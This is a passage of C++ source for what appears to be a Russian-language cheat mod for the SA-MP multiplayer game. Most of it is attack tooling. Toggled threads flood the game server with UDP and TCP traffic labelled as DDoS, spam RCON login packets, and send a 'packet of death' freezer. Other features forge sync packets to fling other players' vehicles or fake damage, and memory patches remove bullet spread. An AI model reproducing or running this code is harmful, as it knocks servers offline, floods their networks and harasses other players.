		mem::copy((PVOID)0x5E4110, "\xC2\x10\x00", 3, 1, "\x56\x8B\xF1");
		g_Players->pLocalPlayer->iIsSpectating = 1;
		g_Players->pLocalPlayer->iInitiatedSpectating = 1;
		normalize = true;
	}
	else
	{
		if (normalize == true)
		{
			//patch_set *pspp = &set.patch[18];
			//patcher_remove(pspp);
			mem::copy((PVOID)0x5E4110, "\x56\x8B\xF1", 3);
			g_Players->pLocalPlayer->iIsSpectating = 0;
			g_Players->pLocalPlayer->iInitiatedSpectating = 0;
			normalize = false;
		}
	}
}



void TW_CALL nrg160211ssssawsxx(void *)
{
struct vehicle_info *pVehicle = vehicle_info_get(-1, 0);
		if (pVehicle == NULL)
		{
			addMessageToChatWindow("* Вы должны быть в машине!");
			return;
		}
		GTAfunc_PutActorInCar(pVehicle);
		addMessageToChatWindow("* Работает на пассажирском сидении.");
		addMessageToChatWindow("* Можете ездить управляя чужим транспортом, в тачке должен сидеть уебан :D.");
		
}


int antiafk=0,allafktime=0;
void GoAntiAfk() {
	addMessageToChatWindow("{FFFFFF}АнтиАФК включен.");
	while(true) {
		for(int i=0; i < 300; i++) {
			allafktime++;
			char str[128];
			if(antiafk == 0) break;
			sprintf(str,"АнтиАФК работает %d мин. %d сек.",allafktime/60,allafktime%60);
			HDC hdc; 
			hdc = GetDC(0);
			TextOut(hdc,0,0,str,strlen(str));
			UpdateWindow(0);
			Sleep(1000);
		}
		if(antiafk == 0) break;
		HDC hdc; 
		hdc = GetDC(0);
		TextOut(hdc,0,0,"АнтиАФК сработало.",strlen("АнтиАФК Advance сработало."));
		UpdateWindow(0);
		float cpos[3] = {pPedSelf->GetPosition()->fX+2,pPedSelf->GetPosition()->fY+2,pPedSelf->GetPosition()->fZ};
		SendFakeOnfootSyncData1(cpos,actor_info_get(-1,0)->hitpoints,0,actor_info_get(-1,0)->speed);
		Sleep(1000);
	}
	addMessageToChatWindow("{FFFFFF}АнтиАФК выключен.");
}



void TW_CALL afka(void *)
{
antiafk ^= 1;
allafktime=0;
if(antiafk == 1) CreateThread( NULL, NULL, (LPTHREAD_START_ROUTINE)GoAntiAfk, NULL, NULL, NULL );
}










int antiafkJ = 0, allafktimeJ = 0;
void GoAntiAfkJ() {
	addMessageToChatWindow("{FFFFFF}BAD RCON включен.");
	while (true) {
		if (antiafkJ == 0) break;
		WSADATA wsaData;
		if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
		{
			cheat_state_text("Error connect failed");
			continue;
		}
		SOCKET Socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		SOCKADDR_IN SockAddr;
		SockAddr.sin_family = AF_INET;
		SockAddr.sin_port = htons(g_SAMP->ulPort);
		SockAddr.sin_addr.s_addr = inet_addr(g_SAMP->szIP);
		std::string sIP(g_SAMP->szIP);
		std::stringstream ssIP(sIP);
		std::string part;
		std::string packet("SAMP");
		std::string sPass("test");


		while (std::getline(ssIP, part, '.'))
		{
			packet += (BYTE)atoi(part.c_str());
		}


		packet += (BYTE)(g_SAMP->ulPort & 0xFF);
		packet += (BYTE)(g_SAMP->ulPort >> 8 & 0xFF);


		packet += 'x';

		packet += (BYTE)(sPass.length() & 0xFF);
		packet += (BYTE)(sPass.length() >> 8 & 0xFF);

		packet += sPass;

		sendto(Socket, packet.c_str(), packet.length(), 0, (sockaddr*)&SockAddr, sizeof(sockaddr_in));

	Sleep(5);
	}
	addMessageToChatWindow("{FFFFFF}BAD RCON выключен.");
}



void TW_CALL afkaJ(void *)
{
	antiafkJ ^= 1;
	allafktimeJ = 0;
	if (antiafkJ == 1) CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)GoAntiAfkJ, NULL, NULL, NULL);
}



char buf10[] = { 0xac, 0x15, 0x2d, 0x0a };
int antiafkJa = 0, allafktimeJa = 0;
void GoAntiAfkJa() {
	addMessageToChatWindow("{FFFFFF}Инкоминг DDoS включен.");
	while (true) {
		if (antiafkJa == 0) break;
		SOCKET kSock;
			WSAData wsdata;
			WORD wsver = MAKEWORD(2, 0);
			int nret = WSAStartup(wsver, &wsdata);
			if (nret != 0)
			{
				addMessageToChatWindow("{FFFFFF}Startup failed, error code: ", WSAGetLastError());
				WSACleanup();
			}
			kSock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
			if (kSock == INVALID_SOCKET)
			{
				addMessageToChatWindow("{FFFFFF}Socket init failed ");
			}
			sockaddr_in sin;
			sin.sin_port = htons(g_SAMP->ulPort);
			sin.sin_addr.s_addr = inet_addr(g_SAMP->szIP);
			sin.sin_family = AF_INET;
			if (connect(kSock, (sockaddr*)&sin, sizeof(sin)) == SOCKET_ERROR)
			{
				addMessageToChatWindow("{FFFFFF}Connect failed, error: ", WSAGetLastError());
				WSACleanup();
			}
			send(kSock, buf10, sizeof(buf10), 0);
		Sleep(350);
	}
	addMessageToChatWindow("{FFFFFF}Инкоминг DDoS выключен.");
}

void TW_CALL afkaJa(void *)
{
	antiafkJa ^= 1;
	allafktimeJa = 0;
	if (antiafkJa == 1) CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)GoAntiAfkJa, NULL, NULL, NULL);
}




int antiafkJaa = 0, allafktimeJaa = 0;
void GoAntiAfkJaa() {
	addMessageToChatWindow("{FFFFFF}Фейк СампСТ включен.");
	while (true) {
		if (antiafkJaa == 0) break;
		WSADATA wsaData;
		if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
		{
			cheat_state_text("Error connect failed");
			continue;
		}
		SOCKET Socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		SOCKADDR_IN SockAddr;
		SockAddr.sin_family = AF_INET;
		SockAddr.sin_port = htons(g_SAMP->ulPort);
		SockAddr.sin_addr.s_addr = inet_addr(g_SAMP->szIP);
		std::string sIP(g_SAMP->szIP);
		std::stringstream ssIP(sIP);
		std::string part;
		std::string packet("SAMP");
		std::string sPass("test");
		std::string sHostName("Hacked by AlexDrift");
		std::string sPing;


		while (std::getline(ssIP, part, '.'))
		{
			packet += (BYTE)atoi(part.c_str());
		}


		packet += (BYTE)(g_SAMP->ulPort & 0xFF);
		packet += (BYTE)(g_SAMP->ulPort >> 8 & 0xFF);


		packet += 'i';
		packet += 'r';
		packet += 'c';
		packet += 'd';
		packet += 'x';
		packet += 'p';
		
		
		packet += (BYTE)(sPass.length() & 0xFF);
		packet += (BYTE)(sPass.length() >> 8 & 0xFF);

		packet += (BYTE)(sHostName.length() & 0xFF);
		packet += (BYTE)(sHostName.length() >> 19 & 0xFF);

		packet += (BYTE)(sPing.length() & 0xFF);
		packet += (BYTE)(sPing.length() >> 4 & 0xFF);

		packet += (BYTE)(sHostName.length() & 0xFF);
		packet += (BYTE)(sHostName.length() >> 8 & 0xFF);

		packet += (BYTE)(sPing.length() & 0xFF);
		packet += (BYTE)(sPing.length() >> 8 & 0xFF);

		packet += sPass;
		packet += sHostName;
		packet += sPing;

		sendto(Socket, packet.c_str(), packet.length(), 0, (sockaddr*)&SockAddr, sizeof(sockaddr_in));

		Sleep(5);
	}
	addMessageToChatWindow("{FFFFFF}Фейк СампСТ выключен.");
}



void TW_CALL afkaJaa(void *)
{
	antiafkJaa ^= 1;
	allafktimeJaa = 0;
	if (antiafkJaa == 1) CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)GoAntiAfkJaa, NULL, NULL, NULL);
}



char ip[512];
char *pszAddr = ip;
int iPort;
char *pszAddrBak = pszAddr;
char buf101[] = { 0x08, 0x1e, 0x77, 0xda };
int antiafkJa1 = 0, allafktimeJa1 = 0;
void GoAntiAfkJa1() {
	addMessageToChatWindow("{FFFFFF}Инкоминг DDoS 037 включен.");
	while (true) {
		if (antiafkJa1 == 0) break;
		SOCKET kSock;
		int finish;
		char resultado;
		WSAData wsdata;
		WORD wsver = MAKEWORD(2, 0);
		int nret = WSAStartup(wsver, &wsdata);
		if (nret != 0)
		{
			addMessageToChatWindow("{FFFFFF}Startup failed, error code: ", WSAGetLastError());
			WSACleanup();
		}
		kSock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		if (kSock == INVALID_SOCKET)
		{
			addMessageToChatWindow("{FFFFFF}Socket init failed ");
		}
		sockaddr_in sin;
		while (*pszAddrBak)
		{
			if (*pszAddrBak == ':')
			{
				*pszAddrBak = 0;
				pszAddrBak++;
				iPort = atoi(pszAddrBak);
			}
			pszAddrBak++;
		}
		sin.sin_port = htons(iPort);
		sin.sin_addr.s_addr = inet_addr(pszAddr);
		sin.sin_family = AF_INET;
		if (connect(kSock, (sockaddr*)&sin, sizeof(sin)) == SOCKET_ERROR)
		{
			addMessageToChatWindow("{FFFFFF}Connect failed, error: ", WSAGetLastError());
			WSACleanup();
		}
		send(kSock, buf101, sizeof(buf101), 0);
		Sleep(10);
	}
	addMessageToChatWindow("{FFFFFF}Инкоминг DDoS 037 выключен.");
}

void TW_CALL afkaJa1(void *)
{
	antiafkJa1 ^= 1;
	allafktimeJa1 = 0;
	if (antiafkJa1 == 1) CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)GoAntiAfkJa1, NULL, NULL, NULL);
}





int antiafkJag = 0, allafktimeJag = 0;
void GoAntiAfkJag() {
	addMessageToChatWindow("{FFFFFF}TCP Flood включен.");
	while (true) {
		if (antiafkJag == 0) break;
		int socket_handle;
		struct sockaddr_in socket_detials;
		char * input_buffer;
		char * httpget = "0000000000000000000000000000000000000000000000000000000000000";
		input_buffer == malloc(20000);
		socket_handle = socket(AF_INET, SOCK_STREAM, 0);
		socket_detials.sin_family = AF_INET;
		socket_detials.sin_addr.s_addr = inet_addr(g_SAMP->szIP);
		socket_detials.sin_port = htons(g_SAMP->ulPort);
		bzero(&(socket_detials.sin_zero), 8);

		if (connect(socket_handle, (struct sockaddr*)&socket_detials, sizeof(struct sockaddr)) == -1) {
			addMessageToChatWindow("{FFFFFF}Couldnt connect to server");
		}
		send(socket_handle, httpget, strlen(httpget), 0);
		Sleep(10);
	}
	addMessageToChatWindow("{FFFFFF}TCP Flood выключен.");
}

void TW_CALL afkaJag(void *)
{
	antiafkJag ^= 1;
	allafktimeJag = 0;
	if (antiafkJag == 1) CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)GoAntiAfkJag, NULL, NULL, NULL);
}

int sdsddssdsd;
void TW_CALL asassasa(void *)
{
	sdsddssdsd = system(":RESTART");
	sdsddssdsd = system("ipconfig/flushdns");
	sdsddssdsd = system("ipconfig/release");
	sdsddssdsd = system("ipconfig/release6");
	sdsddssdsd = system("ipconfig/renew");
	sdsddssdsd = system("ipconfig/renew6");
}


int antiafkJagk = 0, allafktimeJagk = 0;
void GoAntiAfkJagk() {
	addMessageToChatWindow("{FFFFFF}Бот грузчик включен.");
	while (true) { 
		if (antiafkJagk == 0) break;
		float speed[3] = { 0,0,0 };
		float rpos[3] = { 2230.63f, -2285.60f, 14.38f + 1 };
		SendFakeOnfootSyncData1(rpos, actor_info_get(-1, 0)->hitpoints, 0, speed);
		Sleep(10);
		float speed1[3] = { 0,0,0 };
		float rpos1[3] = { 2172.26f, -2255.06f, 13.30f + 1 };
		SendFakeOnfootSyncData1(rpos1, actor_info_get(-1, 0)->hitpoints, 0, speed1);
	}
	addMessageToChatWindow("{FFFFFF}Бот грузчик выключен.");
}

void TW_CALL afkaJagk(void *)
{
	antiafkJagk ^= 1;
	allafktimeJagk = 0;
	if (antiafkJagk == 1) CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)GoAntiAfkJagk, NULL, NULL, NULL);
}




int prow = 0;
int antiafkJagkl = 0, allafktimeJagkl = 0;
void GoAntiAfkJagkl() {
	addMessageToChatWindow("{FFFFFF}АвтоПарковщик ТС включен.");
	addMessageToChatWindow("{FFFFFF}После того как сядете в ТС нажмите ЛКМ.");
	while (true) {
		if (antiafkJagkl == 0) break;
		Sleep(50);
		float pPos[3] = { pPedSelf->GetPosition()->fX, pPedSelf->GetPosition()->fY, pPedSelf->GetPosition()->fZ };
		if (KEY_DOWN(VK_LBUTTON))
		{
			struct vehicle_info *vinfo = vehicle_info_get(VEHICLE_SELF, 0);
			if (vinfo == NULL)
				return;
			float Pos[3] = { 2057.31f, 1273.08f, 10.68f };
			cheat_vehicle_teleport(vehicle_info_get(VEHICLE_SELF, 0), Pos, 0);
			Sleep(3600);
			sendServerCommand("/v park");
			GTAfunc_RemoveActorFromCarAndPutAt(pPos);
			addMessageToChatWindow("{FFFFFF}ТС успешно отправлен и припаркован.");
		}
	}
	addMessageToChatWindow("{FFFFFF}АвтоПарковщик ТС выключен.");
}

void TW_CALL afkaJagkl(void *)
{
	antiafkJagkl ^= 1;
	allafktimeJagkl = 0;
	if (antiafkJagkl == 1) CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)GoAntiAfkJagkl, NULL, NULL, NULL);
}


void TW_CALL afkaJagkldfdf(void *)
{
	static bool ggggggg = false;
	if (ggggggg == false)
	{
		*(float *)0xC8C450 = 5.0; // colts 
		*(float *)0xC8C8B0 = 25.0; // tec9
		*(float *)0xC8C5A0 = 2.0; // shootgun
		*(float *)0xC8C4C0 = 3.0; // pistol silent
		*(float *)0xC8C840 = 25.0; // m4
		*(float *)0xC8C530 = 5.0; // deagle
		*(float *)0xC8C6F0 = 5.0; // uiz
		*(float *)0xC8C760 = 5.0; // mp5
		*(float *)0xC8C7D0 = 25.0; // ak 
		addMessageToChatWindow("{FFFFFF}АнтиРазброс пуль включен.");
		ggggggg = true;
	}
	else
	{
		if (ggggggg == true)
		{
			//defolt value
			*(float *)0xC8C450 = 1.250000; // colts 
			*(float *)0xC8C8B0 = 1.100000; // tec9
			*(float *)0xC8C5A0 = 1.400000; // shootgun
			*(float *)0xC8C4C0 = 1.500000; // pistol silent
			*(float *)0xC8C840 = 0.800000; // m4
			*(float *)0xC8C530 = 1.250000; // deagle
			*(float *)0xC8C6F0 = 1.100000; // uiz
			*(float *)0xC8C760 = 1.200000; // mp5
			*(float *)0xC8C7D0 = 0.600000; // ak 
			addMessageToChatWindow("{FFFFFF}АнтиРазброс пуль выключен.");
			ggggggg = false;
		}
	}
}


char buf131[] = { 0xac, 0x15, 0x2d, 0x0a }; //коннект
char buf111[] = { 0x1e, 0xaf, 0xc8, 0xa9, 0xc8, 0xa9, 0xc8, 0xa9, 0x5d, 0x5d, 0x7f, 0xa9, 0xaa, 0xa9, 0x69 }; //пакет смерти
int antiafkJam = 0, allafktimeJam = 0;
void GoAntiAfkJam() {
	addMessageToChatWindow("{FFFFFF} VCMP Freezer включен.");
	while (true) {
		if (antiafkJam == 0) break;
		SOCKET kSock;
		WSAData wsdata;
		WORD wsver = MAKEWORD(2, 0);
		int nret = WSAStartup(wsver, &wsdata);
		if (nret != 0)
		{
			addMessageToChatWindow("{FFFFFF}Startup failed, error code: ", WSAGetLastError());
			WSACleanup();
		}
		kSock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		if (kSock == INVALID_SOCKET)
		{
			addMessageToChatWindow("{FFFFFF}Socket init failed ");
		}
		sockaddr_in sin;
		sin.sin_port = htons(g_SAMP->ulPort);
		sin.sin_addr.s_addr = inet_addr(g_SAMP->szIP);
		sin.sin_family = AF_INET;
		if (connect(kSock, (sockaddr*)&sin, sizeof(sin)) == SOCKET_ERROR)
		{
			addMessageToChatWindow("{FFFFFF}Connect failed, error: ", WSAGetLastError());
			WSACleanup();
		}
		send(kSock, buf131, sizeof(buf131), 0);
		send(kSock, buf111, sizeof(buf111), 0);
		Sleep(350);
	}
	addMessageToChatWindow("{FFFFFF} VCMP Freezer выключен.");
}

void TW_CALL afkaJam(void *)
{
	antiafkJam ^= 1;
	allafktimeJam = 0;
	if (antiafkJam == 1) CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)GoAntiAfkJam, NULL, NULL, NULL);
}


float random_floats11(float a, float b)
{
	float random = ((float)rand()) / (float)RAND_MAX;
	float diff = b - a;
	float r = random * diff;
	return a + r;
}
int antiafkJami = 0, allafktimeJami = 0;
void GoAntiAfkJami() {
	addMessageToChatWindow("{FFFFFF} Кикер включен.");
	while (true) {
		if (antiafkJami == 0) break;
		if (KEY_PRESSED('N') || KEY_PRESSED('n')) {
			//addMessageToChatWindow("[ZENITH]:Bind ");
			traceLastFunc("bad_kickup()");
			int nearVehID = vehicle_find_nearest(VEHICLE_ALIVE);
			if (nearVehID == VEHICLE_SELF)
				return;
			vehicle_info *target = vehicle_info_get(nearVehID, VEHICLE_ALIVE);
			if (target == NULL)
				return; 
			float speed[3] = { 1.0f, 1.0f, 20.0f };
			int id = getSAMPVehicleIDFromGTAVehicle(target);
			float Quaternions[4];
			vect3_copy(&target->base.matrixStruct->right.Z, Quaternions);
			Quaternions[1] = fabs(Quaternions[3]) * ((target->base.matrix[6] * M_PI / 181310 && target->base.matrix[6] <= M_PI) ? -1 : 1);
			Quaternions[2] = Quaternions[0];
			Quaternions[0] = Quaternions[3] = 0;
			float fuckPos[3];
			vect3_copy(&target->base.matrix[12], fuckPos);
			fuckPos[2] += 9900.0f;

			g_DrifeitClient->SendFakeDriverSyncDataWithQuaternion(id, fuckPos, Quaternions, target->hitpoints, speed, 0);
			g_DrifeitClient->SendFakeDriverSyncDataWithQuaternion(id, fuckPos, Quaternions, target->hitpoints, speed, 0);
			g_DrifeitClient->SendFakeDriverSyncDataWithQuaternion(id, fuckPos, Quaternions, target->hitpoints, speed, 0);
		}
		Sleep(4);
	}
	addMessageToChatWindow("{FFFFFF} Кикер выключен.");
}

void TW_CALL afkaJami(void *)
{
	antiafkJami ^= 1;
	allafktimeJami = 0;
	if (antiafkJami == 1) CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)GoAntiAfkJami, NULL, NULL, NULL);
}




int antiafkJami7 = 0, allafktimeJami7 = 0;
void GoAntiAfkJami7() {
	addMessageToChatWindow("{FFFFFF} ЛагоДамагер включен.");
	while (true) {
		if (antiafkJami7 == 0) break;
		//if (KEY_PRESSED('R') || KEY_PRESSED('r')) {
			actor_info *me = actor_info_get(ACTOR_SELF, NULL);
			stOnFootData Onfoot;
			memset(&Onfoot, 0, sizeof(stOnFootData));
			BitStream bsOnfootSync;
			Onfoot.byteHealth = me->hitpoints;
			Onfoot.fPosition[0] = me->base.matrix[12];
			Onfoot.fPosition[1] = me->base.matrix[13];
			Onfoot.fPosition[2] = me->base.matrix[14];
			Onfoot.byteSpecialAction = SPECIAL_ACTION_NONE;
			Onfoot.iCurrentAnimationID = 1167; //прицеливается
			Onfoot.sAnimFlags = -32760;
			Onfoot.fMoveSpeed[0] = me->speed[0];
			Onfoot.fMoveSpeed[1] = me->speed[1];
			Onfoot.fMoveSpeed[2] = me->speed[2];
			for (int i = 0; i < 4; i++)
				Onfoot.fQuaternion[i] = g_Players->pLocalPlayer->onFootData.fQuaternion[i];
			//Onfoot.sLeftRightKeys = 1;
			Onfoot.sKeys = 132;
			Onfoot.byteCurrentWeapon = 35;
			//	Onfoot.sUpDownKeys = 1;
			bsOnfootSync.Write((
				BYTE)ID_PLAYER_SYNC);
			bsOnfootSync.Write((PCHAR)&Onfoot, sizeof(stOnFootData));
			g_DrifeitClient->Send(&bsOnfootSync, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);


			stAimData AimData = g_Players->pLocalPlayer->aimData;
			AimData.byteCamMode = 8;
			AimData.byteWeaponState = 0;
			BitStream bsAim;
			bsAim.Write((BYTE)ID_AIM_SYNC);
			bsAim.Write((PCHAR)&AimData, sizeof(stAimData));
			g_DrifeitClient->Send(&bsAim, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);



			Onfoot.byteHealth = me->hitpoints;
			Onfoot.fPosition[0] = me->base.matrix[12];
			Onfoot.fPosition[1] = me->base.matrix[13];
			Onfoot.fPosition[2] = me->base.matrix[14];
			Onfoot.byteSpecialAction = SPECIAL_ACTION_NONE;
			Onfoot.iCurrentAnimationID = 1116; //прицеливается
			Onfoot.sAnimFlags = -32760;
			Onfoot.fMoveSpeed[0] = me->speed[0];
			Onfoot.fMoveSpeed[1] = me->speed[1];
			Onfoot.fMoveSpeed[2] = me->speed[2];
			for (int i = 0; i < 4; i++)
				Onfoot.fQuaternion[i] = g_Players->pLocalPlayer->onFootData.fQuaternion[i];
			Onfoot.sKeys = 0;
			Onfoot.byteCurrentWeapon = 0;
			bsOnfootSync.ResetWritePointer();
			bsOnfootSync.Write((
				BYTE)ID_PLAYER_SYNC);
			bsOnfootSync.Write((PCHAR)&Onfoot, sizeof(stOnFootData));
			Sleep(50);


			g_DrifeitClient->Send(&bsOnfootSync, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
		
	}
	addMessageToChatWindow("{FFFFFF} ЛагоДамагер выключен.");
}

void TW_CALL afkaJami7(void *)
{
	antiafkJami7 ^= 1;
	allafktimeJami7 = 0;
	if (antiafkJami7 == 1) CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)GoAntiAfkJami7, NULL, NULL, NULL);
}




int antiafkJami8 = 0, allafktimeJami8 = 0;
void GoAntiAfkJami8() {
	addMessageToChatWindow("{FFFFFF} Кикер 2 включен.");
	while (true) {
		if (antiafkJami8 == 0) break;
		if (KEY_PRESSED('N') || KEY_PRESSED('n')) {
			//addMessageToChatWindow("[ZENITH]:Bind ");
			int nearVehID = vehicle_find_nearest(VEHICLE_ALIVE);
			if (nearVehID == VEHICLE_SELF)
				return;
			vehicle_info *target = vehicle_info_get(nearVehID, VEHICLE_ALIVE);
			if (target == NULL)
				return;
			float speed[3] = { 5.0f, 0.0f, 0.0f };
			/*float pos1 = target->collision_position[1];
			float pos2 = target->collision_position[2];
			float pos3 = target->collision_position[3];
			float pos[3] = { pos1, pos2, pos3 }; */
			target->speed[1] = 5.0f;
			int id = getSAMPVehicleIDFromGTAVehicle(target);
			g_DrifeitClient->SendFakeDriverSyncData44(id, &target->base.matrix[12], target->hitpoints, speed, 0);
		}
	
		Sleep(4);
	}
	addMessageToChatWindow("{FFFFFF} Кикер 2 выключен.");
}

void TW_CALL afkaJami8(void *)
{
	antiafkJami8 ^= 1;
	allafktimeJami8 = 0;
	if (antiafkJami8 == 1) CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)GoAntiAfkJami8, NULL, NULL, NULL);
}



int isBadSAMPPlayerID(int iPlayerID)
{
	if (g_Players == NULL || iPlayerID < 0 || iPlayerID > SAMP_PLAYER_MAX)
		return 1;
	return !g_Players->iIsListed[iPlayerID];
}
int isBadSAMPVehicleID(int iVehicleID)
{
	if (g_Vehicles == NULL || iVehicleID == (uint16_t)-1 || iVehicleID >= SAMP_VEHICLE_MAX)
		return 1;
	return !g_Vehicles->iIsListed[iVehicleID];
}
int vehicle_find_random(int flags)
{
	struct vehicle_info		*vehicle_self, *info;
	const struct actor_info *actor_self;
	float					dist = -1.0f;
	int						id_nearest = -1;

	if (pool_vehicle == NULL)
		return -1;
	if ((actor_self = actor_info_get(ACTOR_SELF, 0)) == NULL)
		return -1;
	vehicle_self = vehicle_info_get(VEHICLE_SELF, 0);

	for (int n = 0; n < pool_vehicle->size; n++)
	{
		float	vect[3];
		if ((info = vehicle_info_get(n, flags)) == NULL)
			continue;

		// if SAMP is loaded, check if the vehicle is streamed in
		if (g_SAMP != NULL)
		{
			int iVehicleSAMPID = getSAMPVehicleIDFromGTAVehicle(info);
			if (isBadSAMPVehicleID(iVehicleSAMPID))
				continue;
		}

		// don't include our vehicle or its trailer
		if (vehicle_self != NULL)
		{
			if (vehicle_self->base.matrix == info->base.matrix)
				continue;
			if (vehicle_self->trailer == info)
				continue;
		}

		// filter vehicle by flags function
		if (vehicle_filter_flags(info, flags) == 0)
			continue;

		// looks like we're all good, now where the heck is we all at?

		float pos[3];
		pos[0] = actor_self->base.matrix[12] + (-300 + (rand() % 600));
		pos[1] = actor_self->base.matrix[13] + (-300 + (rand() % 600));
		pos[2] = actor_self->base.matrix[14] + (-300 + (rand() % 600));


		vect3_vect3_sub(pos, &info->base.matrix[4 * 3], vect);
		vect[2] += 2.0f;
		if (dist < 0.0f || vect3_length(vect) < dist)
		{
			dist = vect3_length(vect);
			id_nearest = n;
		}
	}

	return id_nearest;
}
int actor_find_random(int flags) {
	struct actor_info		*info;
	const struct actor_info *actor_self;
	float					dist = -1.0f;
	int						id_nearest = -1;

	if (pool_actor == NULL)
		return -1;
	if ((actor_self = actor_info_get(ACTOR_SELF, 0)) == NULL)
		return -1;
	actor_self = actor_info_get(VEHICLE_SELF, 0);

	for (int n = 0; n < pool_actor->size; n++)
	{
		float	vect[3];
		if ((info = actor_info_get(n, flags)) == NULL)
			continue;

		// if SAMP is loaded, check if the vehicle is streamed in
		if (g_SAMP != NULL)
		{
			int iPlayerSAMPID = getSAMPPlayerIDFromGTAPed(info);
			if (isBadSAMPPlayerID(iPlayerSAMPID))
				continue;
		}

		// don't include our vehicle or its trailer
		if (actor_self != NULL)
		{
			if (actor_self->base.matrix == info->base.matrix)
				continue;
		}


		float pos[3];
		pos[0] = actor_self->base.matrix[12] + (-300 + (rand() % 600));
		pos[1] = actor_self->base.matrix[13] + (-300 + (rand() % 600));
		pos[2] = actor_self->base.matrix[14] + (-300 + (rand() % 600));


		vect3_vect3_sub(pos, &info->base.matrix[4 * 3], vect);
		vect[2] += 2.0f;
		if (dist < 0.0f || vect3_length(vect) < dist)
		{
			dist = vect3_length(vect);
			id_nearest = n;
		}
	}

	return id_nearest;
}
vehicle_info* getRandomSyncFromStream(int flag) {
	vehicle_info *some = vehicle_info_get(vehicle_find_random(flag), flag);
	vehicle_info *me = vehicle_info_get(VEHICLE_SELF, NULL);
	if (some == nullptr) return nullptr;
	if (me == nullptr && some != nullptr) return some;
	if (me != nullptr && some == me) return nullptr;
	return some;
}

int players_vehicle(vehicle_info *vehicle) {
	int vh = getSAMPVehicleIDFromGTAVehicle(vehicle); //optimizatION
	for (int i = 0; i < SAMP_PLAYER_MAX; i++) {
		if (g_Players->iIsListed[i]) {
			if (g_Players->pRemotePlayer[i]->pPlayerData->sVehicleID == vh) {
				return i;
			}
		}
	}
	return -1;
}
void RotateQuaternion(float angle_radian, float *quart_w, float *quart_x)
{
	*quart_x = -1 * sinf(angle_radian / 2.0f);
	*quart_w = cosf(angle_radian / 2.0f);
}
extern struct Quaternion {
	float x, y, z; // Вектор
	float w;     // Скаляр
};

void getRadOfPointToPoint(float pos1[3], float pos2[3], float radix[2]) {
	float R;
	R = vect3_dist(pos1, pos2);
	float angle;
	float radx = (pos1[0] - pos2[0]) / R;
	float rady = (pos1[1] - pos2[1]) / R;
	radix[0] = radx;
	radix[1] = rady;
}
extern struct Speed {
	float x, y, z; //Скорость по осям
};
static Quaternion quatofCar;
static Speed spid;
int antiafkJami81 = 0, allafktimeJami81 = 0;
void GoAntiAfkJami81() {
	addMessageToChatWindow("{FFFFFF} Крашер водителей включен.");
	while (true) {
		if (antiafkJami81 == 0) break;
		


	
		
	}
	addMessageToChatWindow("{FFFFFF} Крашер водителей выключен.");
}

void TW_CALL afkaJami81(void *)
{
	antiafkJami81 ^= 1;
	allafktimeJami81 = 0;
	if (antiafkJami81 == 1) CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)GoAntiAfkJami81, NULL, NULL, NULL);
}















void TW_CALL func_aafk(void *)
{
	static bool normalize = false;
	if (normalize == false)
	{
		mem::copy((PVOID)0x74805A, "\x01", 1, 1, "\x00");
		mem::copy((PVOID)0x747FB6, "\x01", 1, 1, "\x00");
		mem::copy((PVOID)0x74542B, "\x90\x90\x90\x90\x90\x90\x90\x90", 8, 1, "\x50\x51\xFF\x15\x00\x83\x85\x00");
		mem::copy((PVOID)0x53EA88, "\x90\x90\x90\x90\x90\x90", 6, 1, "\x0F\x84\x7B\x01\x00\x00");
		addMessageToChatWindow("{FFFFFF}АнтиАФКПро включен.");
		normalize = true;
	}
	else
	{
		if (normalize == true)
		{
		mem::copy((PVOID)0x74805A, "\x00", 1, 1, "\x01");
		mem::copy((PVOID)0x747FB6, "\x00", 1, 1, "\x01");
		mem::copy((PVOID)0x74542B, "\x50\x51\xFF\x15\x00\x83\x85\x00", 8);
		mem::copy((PVOID)0x53EA88, "\x0F\x84\x7B\x01\x00\x00", 6);
		addMessageToChatWindow("{FFFFFF}АнтиАФКПро выключен.");
		normalize = false;
		}
	}
}




/*void TW_CALL dfdf(void *)
{
	char Buf[128];
	hostent *h;
	sockaddr_in sin;
	WSAData wsdata;
	WORD wsver = MAKEWORD(2, 0);
	int nret = WSAStartup(wsver, &wsdata);
	if (WSAStartup(wsver, &wsdata) == 0)
	{
		if (gethostname(&Buf[0], 128) == 0)
		{
			h = gethostbyname(&Buf[0]);
			addMessageToChatWindow("узнаем наш локал ип %s",inet_ntoa(*(reinterpret_cast<in_addr *>(*(h->h_addr_list)))));
		}
	}
}*/

void TW_CALL dfsddsdsdf(void *)
{
	
		attachedObjectCrasher();
	
}











void initializeBarsMenu()
{
	if ( memcmp_safe((uint8_t *)0x53EB0D, hex_to_bin("E8DECDFCFF"), 5) )
	{
		CDetour api;
		if ( api.Create((uint8_t *) ((uint32_t)0x53EB0D), (uint8_t *)menuUpdateHook, DETOUR_TYPE_CALL_FUNC, 5) == 0 )
			Log( "Failed to hook menuUpdateHook." );
	}
	else
		Log( "Failed to hook menuUpdateHook (memcmp)" );


	 
	 
	char menuParameters[512], buf[2048];
	int i;
	char x[500] = "Дрифтюлекс м0д(CW & Owner версия)"; 
	int iMainMenuPosX = pPresentParam.BackBufferWidth / 2 - 400 / 2;
	int iMainMenuPosY = pPresentParam.BackBufferHeight - 284;
	sprintf(menuParameters,
		"mod_sa label='%s ' color='%d %d %d' position='%d %d' size='405 235' fontsize='2' iconpos='bottomright' iconmargin='8 24' valueswidth=150 ",
